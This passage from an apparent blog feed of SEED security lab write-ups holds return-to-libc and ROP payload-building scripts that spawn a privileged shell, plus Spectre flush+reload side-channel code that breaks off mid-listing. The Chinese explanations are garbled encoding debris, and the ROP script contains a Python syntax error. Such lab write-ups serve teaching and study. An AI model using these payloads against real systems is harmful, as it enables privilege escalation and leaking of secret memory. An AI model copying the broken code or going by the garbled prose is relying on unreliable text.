class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>        <span class="hljs-keyword">char</span> *shell=getenv(<span class="hljs-string">&quot;MYSHELL&quot;</span>);<br>        <span class="hljs-keyword">char</span> *p=getenv(<span class="hljs-string">&quot;P&quot;</span>);<br>        <span class="hljs-keyword">if</span>(shell)<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x\n&quot;</span>,(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)shell);<br>        <span class="hljs-keyword">if</span>(p)<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x\n&quot;</span>,(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)p);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>ä½¿ç”¨gdbæ‰¾åˆ°execvå‡½æ•°ä¸exitå‡½æ•°çš„åœ°å€ï¼Œä½¿ç”¨gdbçš„findå‘½ä»¤å¯ä»¥æŸ¥æ‰¾å­—ç¬¦ä¸²çš„åœ°å€</li><li>ç»„ç»‡payloadå­—ç¬¦ä¸²</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># Fill content with non-zero values</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0xaa</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">300</span>))<br><br>Z = <span class="hljs-number">0x120</span>+<span class="hljs-number">8</span><br>zero_addr = <span class="hljs-number">0</span><span class="hljs-comment"># The address of &quot;NULL&quot;</span><br>content[Z:Z+<span class="hljs-number">4</span>] = (zero_addr).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br><br>X = <span class="hljs-number">0x120</span>+<span class="hljs-number">4</span><br>p_addr =    <span class="hljs-number">0xffffd6d7</span>        <span class="hljs-comment"># The address of &quot;-p&quot;</span><br>content[X:X+<span class="hljs-number">4</span>] = (p_addr).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>Y = <span class="hljs-number">0x120</span><br>sh_addr1 = <span class="hljs-number">0xffffd461</span>         <span class="hljs-comment"># The address of &quot;/bin/bash&quot; argv[0]</span><br>content[Y:Y+<span class="hljs-number">4</span>] = (sh_addr1).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>A = <span class="hljs-number">40</span><br>addr = <span class="hljs-number">0xffffce00</span>+<span class="hljs-number">0x120</span>         <span class="hljs-comment"># point to pointer </span><br>content[A:A+<span class="hljs-number">4</span>] = (addr).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-comment"># above : start of argv[]</span><br><br>B = <span class="hljs-number">36</span><br>sh_addr = <span class="hljs-number">0xffffd461</span>       <span class="hljs-comment"># The address of &quot;/bin/bash&quot;</span><br>content[B:B+<span class="hljs-number">4</span>] = (sh_addr).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>C = <span class="hljs-number">32</span><br>exit_addr = <span class="hljs-number">0xf7e03f80</span>  <span class="hljs-comment"># The address of exit()</span><br>content[C:C+<span class="hljs-number">4</span>] = (exit_addr).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>D = <span class="hljs-number">28</span><br>execv_addr = <span class="hljs-number">0xf7e984b0</span>  <span class="hljs-comment"># The address of execv()</span><br>content[D:D+<span class="hljs-number">4</span>] = (execv_addr).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-comment"># Save content to a file</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;badfile&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br><br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¡äº†å¾ˆä¹…ï¼Œå› ä¸ºæˆ‘åœ¨æ„å»ºargv[]çš„æ—¶å€™ï¼Œä¸€ç›´é€‰æ‹©ç´§é‚»exitå‡½æ•°çš„åœ°æ–¹ï¼Œè¿™æ ·inputçš„ç¼“å†²åŒºå¯èƒ½ä¼šè¢«bufferè¦†ç›–ï¼Œæ„Ÿè°¢<a href="https://munian.life/2022/04/07/SeedLab2.0-Buffer-Overflow/%E8%BF%99%E7%AF%87%E5%8D%9A%E5%AE%A2%EF%BC%8C%E6%8F%90%E9%86%92%E4%BA%86%E6%88%91%E8%A6%81%E5%9C%A8%E8%BE%83%E8%BF%9C%E5%9C%B0%E5%9D%80%E5%A4%84%E6%9E%84%E5%BB%BA%E7%BC%93%E5%86%B2%E5%8C%BA%E5%86%85%E5%AE%B9">https://munian.life/2022/04/07/SeedLab2.0-Buffer-Overflow/è¿™ç¯‡åšå®¢ï¼Œæé†’äº†æˆ‘è¦åœ¨è¾ƒè¿œåœ°å€å¤„æ„å»ºç¼“å†²åŒºå†…å®¹</a></p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/image_2.png"></p><h1 id="Task-5-Optional-Return-Oriented-Programming"><a href="#Task-5-Optional-Return-Oriented-Programming" class="headerlink" title="Task 5 (Optional): Return-Oriented Programming"></a>Task 5 (Optional): Return-Oriented Programming</h1><p>è¿™ä¸ªè¦æ¯”task4ç®€å•å¤šäº†ï¼Œå…ˆforå¾ªç¯å¡«å……10ä¸ªfooå‡½æ•°çš„åœ°å€ï¼Œç„¶åæŒ‰ç…§ç±»ä¼¼task3çš„æ­¥éª¤å¡«å……systemã€exitã€/bin/shå³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># Fill content with non-zero values</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0xaa</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">300</span>))<br><br>D = <span class="hljs-number">28</span><br>foo_addr = <span class="hljs-number">0x565562b0</span><br><span class="hljs-keyword">for</span>(i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>))<br>content[D:D+<span class="hljs-number">4</span>] = (foo_addr).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>D=D+<span class="hljs-number">4</span><br><br>Y = D<br>system_addr = <span class="hljs-number">0xf7e11420</span>        <span class="hljs-comment"># The address of system()</span><br>content[Y:Y+<span class="hljs-number">4</span>] = (system_addr).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>Z = Y+<span class="hljs-number">4</span><br>exit_addr = <span class="hljs-number">0xf7e03f80</span>           <span class="hljs-comment"># The address of exit()</span><br>content[Z:Z+<span class="hljs-number">4</span>] = (exit_addr).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>X = Z+<span class="hljs-number">4</span><br>sh_addr = <span class="hljs-number">0xffffd461</span>            <span class="hljs-comment"># The address of &quot;/bin/sh&quot;</span><br>content[X:X+<span class="hljs-number">4</span>] = (sh_addr).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-comment"># Save content to a file</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;badfile&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/QQ%E5%9B%BE%E7%89%8720230123154648.png"></p>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SEED-labï¼šSpectre Attack Lab</title>
    <link href="/p/2724e696/"/>
    <url>/p/2724e696/</url>
    
    <content type="html"><![CDATA[<h1 id="Out-of-Order-Execution-and-Branch-Prediction"><a href="#Out-of-Order-Execution-and-Branch-Prediction" class="headerlink" title="Out-of-Order Execution and Branch Prediction"></a>Out-of-Order Execution and Branch Prediction</h1><p>ä¸ºäº†æé«˜è¿è¡Œæ•ˆç‡ï¼ŒCPUå…·æœ‰ä¸¤ä¸ªé‡è¦ç‰¹æ€§ï¼š</p><ul><li>ä¹±åºæ‰§è¡Œ</li><li>åˆ†æ”¯é¢„æµ‹</li></ul><blockquote><p>ç°ä»£é«˜æ€§èƒ½ CPU ä¸å†ä¸¥æ ¼æŒ‰ç…§æŒ‡ä»¤çš„åŸå§‹é¡ºåºæ‰§è¡ŒæŒ‡ä»¤ï¼Œè€Œæ˜¯å…è®¸ä¹±åºæ‰§è¡Œè€—å°½æ‰€æœ‰çš„æ‰§è¡Œå•å…ƒã€‚ä»¥æé«˜æ•ˆç‡</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">size=<span class="hljs-number">10</span>;<br>data = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (x &lt; size) &#123;<br>data = data + <span class="hljs-number">5</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ ¹æ®æˆ‘ä»¬ä¹‹å‰çš„å°è±¡ï¼Œå¦‚æœxçš„å€¼å°äºsizeï¼Œé‚£ä¹ˆæ‰ä¼šæ‰§è¡Œç¬¬äº”è¡Œä»£ç ï¼Œä½†æ˜¯å®é™…ä¸Šï¼Œå³æ˜¯xçš„å€¼å¤§äºç­‰äºsizeï¼Œç¬¬å››è¡Œä¹Ÿä¼šå»æ‰§è¡Œ</p><p>ä¹±åºæ‰§è¡Œæ˜¯ä¸€ç§ä¼˜åŒ–æŠ€æœ¯ï¼Œå…è®¸ CPU æœ€å¤§é™åº¦åœ°åˆ©ç”¨å…¶æ‰€æœ‰æ‰§è¡Œå•å…ƒã€‚CPU æ²¡æœ‰ä¸¥æ ¼æŒ‰é¡ºåºå¤„ç†æŒ‡ä»¤ï¼Œè€Œæ˜¯åœ¨æ‰€æœ‰æ‰€éœ€èµ„æºéƒ½å¯ç”¨æ—¶ç«‹å³å¹¶è¡Œæ‰§è¡ŒæŒ‡ä»¤ã€‚å½“å½“å‰æ“ä½œçš„æ‰§è¡Œå•å…ƒè¢«å ç”¨æ—¶ï¼Œå…¶ä»–æ‰§è¡Œå•å…ƒå¯ä»¥æå‰è¿è¡Œ</p><p>ç¬¬2è¡Œæ¶‰åŠä¸¤ä¸ªæ“ä½œ:</p><ul><li>å†…å­˜ä¸­åŠ è½½ size çš„å€¼</li><li>å°†sizeå€¼ä¸ x è¿›è¡Œæ¯”è¾ƒ </li></ul><p>å¦‚æœ size ä¸åœ¨ CPU ç¼“å­˜ä¸­ï¼Œé‚£ä¹ˆè¯»å–è¯¥å€¼ä¹‹å‰å¯èƒ½éœ€è¦æ•°ç™¾ä¸ª CPU æ—¶é’Ÿå‘¨æœŸã€‚ç°ä»£ CPU ä¸ä¼šé—²ç½®ï¼Œè€Œæ˜¯å°è¯•é¢„æµ‹ifè¯­å¥ä¸­çš„æ¯”è¾ƒçš„ç»“æœï¼Œå¹¶æ ¹æ®ä¼°è®¡æ‰§è¡Œåˆ†æ”¯ã€‚è¿™ç§æ‰§è¡Œåœ¨æ¯”è¾ƒç»“æŸä¹‹å‰å°±å¼€å§‹äº†ï¼Œä¹Ÿå³æ˜¯ä¹±åºæ‰§è¡Œ</p><p>åœ¨æ‰§è¡Œä¹±åºæ‰§è¡Œä¹‹å‰ï¼ŒCPU ä¼šå­˜å‚¨å¯„å­˜å™¨çš„å½“å‰çŠ¶æ€å’Œå€¼ã€‚å½“ size çš„å€¼æœ€ç»ˆåˆ°è¾¾æ—¶ï¼ŒCPU å°†æ£€æŸ¥å®é™…ç»“æœ</p><ul><li>å¦‚æœé¢„æµ‹æ­£ç¡®ï¼Œåˆ™æäº¤é¢„æµ‹æ‰§è¡Œï¼Œè¿™ä¸ªæƒ…å†µä¼šè·å¾—æ˜¾è‘—çš„æ€§èƒ½æé«˜</li><li>å¦‚æœé¢„æµ‹é”™è¯¯ï¼ŒCPU å°†æ¢å¤åˆ°ä¿å­˜çŠ¶æ€ï¼Œä¹Ÿå³æ˜¯ä¹±åºæ‰§è¡Œäº§ç”Ÿçš„æ‰€æœ‰ç»“æœå°†è¢«ä¸¢å¼ƒï¼Œå°±åƒä»æœªå‘ç”Ÿè¿‡ä¸€æ ·ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬ä»å¤–é¢çœ‹åˆ°3å·çº¿ä»æœªè¢«æ‰§è¡Œ</li></ul><p>å¹½çµæ¼æ´åœ¨äºï¼Œå¤„ç†å™¨å‚å•†å¿½ç•¥äº†åˆ†æ”¯é¢„æµ‹å¯¹ CPU ç¼“å­˜çš„å½±å“ã€‚åœ¨ä¹±åºæ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œè¢«å¼•ç”¨çš„å†…å­˜è¢«æå–åˆ°ä¸€ä¸ªå¯„å­˜å™¨ä¸­ï¼Œå¹¶å­˜å‚¨åœ¨ç¼“å­˜ä¸­ã€‚å‚å•†åªæ˜¯ä¸¢å¼ƒäº†ä¹±åºæ‰§è¡Œçš„ç»“æœï¼Œä½†æ˜¯å´æ²¡æœ‰ä¸¢å¼ƒå¯¹CPUç¼“å­˜çš„å½±å“</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230225223421.png"></p><p>SpectreExperiment.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;emmintrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;x86intrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> CACHE_HIT_THRESHOLD (80)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DELTA 1024</span><br><br><span class="hljs-keyword">int</span> size = <span class="hljs-number">10</span>;<br><span class="hljs-keyword">uint8_t</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">256</span>*<span class="hljs-number">4096</span>];<br><span class="hljs-keyword">uint8_t</span> temp = <span class="hljs-number">0</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">flushSideChannel</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> i;<br><br>  <span class="hljs-comment">// Write to array to bring it to RAM to prevent Copy-on-write</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) <span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA] = <span class="hljs-number">1</span>;<br><br>  <span class="hljs-comment">//flush the values of the array from cache</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) _mm_clflush(&amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> +DELTA]);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">reloadSideChannel</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> junk=<span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">register</span> <span class="hljs-keyword">uint64_t</span> time1, time2;<br>  <span class="hljs-keyword">volatile</span> <span class="hljs-keyword">uint8_t</span> *addr;<br>  <span class="hljs-keyword">int</span> i;<br>  <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)&#123;<br>    addr = &amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA];<br>    time1 = __rdtscp(&amp;junk);<br>    junk = *addr;<br>    time2 = __rdtscp(&amp;junk) - time1;<br>    <span class="hljs-keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;array[%d*4096 + %d] is in cache.\n&quot;</span>, i, DELTA);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The Secret = %d.\n&quot;</span>, i);<br>    &#125;<br>  &#125; <br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">victim</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span> (x &lt; size) &#123;  <br>      temp = <span class="hljs-built_in">array</span>[x * <span class="hljs-number">4096</span> + DELTA];  <br>  &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> i;<br><br>  <span class="hljs-comment">// FLUSH the probing array</span><br>  flushSideChannel();<br><br>  <span class="hljs-comment">// Train the CPU to take the true branch inside victim()</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;   <br>      victim(i);<br>  &#125;<br><br>  <span class="hljs-comment">// Exploit the out-of-order execution</span><br>  _mm_clflush(&amp;size);<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)<br>      _mm_clflush(&amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA]); <br>  victim(<span class="hljs-number">97</span>);  <br><br>  <span class="hljs-comment">// RELOAD the probing array</span><br>  reloadSideChannel();<br><br>  <span class="hljs-keyword">return</span> (<span class="hljs-number">0</span>); <br>&#125;<br><br></code></pre></td></tr></table></figure><p>CPUä¼šè®°å½•è¿‡å»é‡‡ç”¨çš„åˆ†æ”¯ï¼Œç„¶ååˆ©ç”¨è¿™äº›è¿‡å»çš„ç»“æœæ¥é¢„æµ‹ if è¯­å¥Speculative_executionä¸­åº”è¯¥é‡‡ç”¨å“ªä¸ªåˆ†æ”¯ã€‚ä¸ºäº†è§¦å‘æ”»å‡»ï¼Œæˆ‘ä»¬éœ€è¦è¯±å¯¼CPUæ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„åˆ†æ”¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-comment">// Train the CPU to take the true branch inside victim()</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;   <br>      victim(i);<br>  &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">victim</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span> (x &lt; size) &#123;  <span class="hljs-comment">// sizeå€¼ä¸º10ï¼Œå› æ­¤ä¸‹é¢è¯­å¥æ¯ä¸€æ¬¡éƒ½ä¼šè¢«æ‰§è¡Œ</span><br>      temp = <span class="hljs-built_in">array</span>[x * <span class="hljs-number">4096</span> + DELTA];  <br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨è®­ç»ƒå®Œä¹‹åï¼Œæˆ‘ä»¬åˆ·æ–°sizeçš„ç¼“å­˜ï¼Œä»è€Œä½¿å¾—åç»­çš„<code>victim(97)</code>è°ƒç”¨ä¸­è¯»å–sizeå€¼éœ€è¦ä¸Šç™¾ä¸ªæ—¶é’Ÿå‘¨æœŸ</p><p>ä¹‹ååˆ·æ–°<code>0~256</code>çš„ç¼“å­˜ï¼Œè¿™ä¼šå¯¼è‡´åŒ…æ‹¬97åœ¨å†…æ‰€æœ‰æ•°å­—ä¸åœ¨ç¼“å­˜å†…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">_mm_clflush(&amp;size);<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)<br>    _mm_clflush(&amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA]); <br></code></pre></td></tr></table></figure><p>ä¹‹åæ‰§è¡Œvictim(97)ï¼ŒæŒ‰å¸¸ç†è€ƒè™‘<code>temp = array[97 * 4096 + DELTA];</code>è¯­å¥ä¸ä¼šè¢«æ‰§è¡Œï¼Œå› æ­¤97ä¹Ÿä¸ä¼šåœ¨CPU cacheä¸­ï¼Œä½†æ˜¯æˆ‘ä»¬å®éªŒç»“æœè¡¨æ˜97åœ¨cacheä¸­ï¼Œå› æ­¤è¯¥è¯­å¥è¢«æ‰§è¡Œäº†</p><blockquote><p>å…³äºä¸ºä»€ä¹ˆéœ€è¦å†™æˆarray[x * 4096 + DELTA]; å¯ä»¥è§æˆ‘meltdownçš„ä¸€ç¯‡æ–‡ç« </p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230225224827.png"></p><p>quiz1ï¼š</p><blockquote><p>Comment out the line marked with P and execute again. Explain your observation. After you are<br>done with this experiment, uncomment it, so the subsequent tasks are not affected</p></blockquote><p>ç»™_mm_clflush(&amp;size);è¿™ä¸€è¡Œä»£ç åŠ æ³¨é‡Šä¹‹åè¿è¡Œï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230225224958.png"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœsizeä»ç„¶åœ¨CPU cacheä¸­ï¼Œé‚£ä¹ˆå¯ä»¥å¿«é€Ÿè·å¾—sizeçš„å€¼ï¼Œå°±ä¸ä¼šå¯¼è‡´ä¹±åºæ‰§è¡Œï¼Œæ— æ³•è·å¾—ç»“æœ</p><p>quiz2:</p><blockquote><p>Replace Line âˆš with victim(i + 20); run the code again and explain your observation.</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230225224958.png"></p><p>åŒæ ·æ— æ³•è·å¾—ç»“æœï¼Œè¯´æ˜CPUçš„åˆ†æ”¯é¢„æµ‹è®­ç»ƒæ˜¯å¿…è¦çš„</p><h1 id="The-Spectre-Attack"><a href="#The-Spectre-Attack" class="headerlink" title="The Spectre Attack"></a>The Spectre Attack</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;emmintrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;x86intrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> bound_lower = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> bound_upper = <span class="hljs-number">9</span>;<br><span class="hljs-keyword">uint8_t</span> 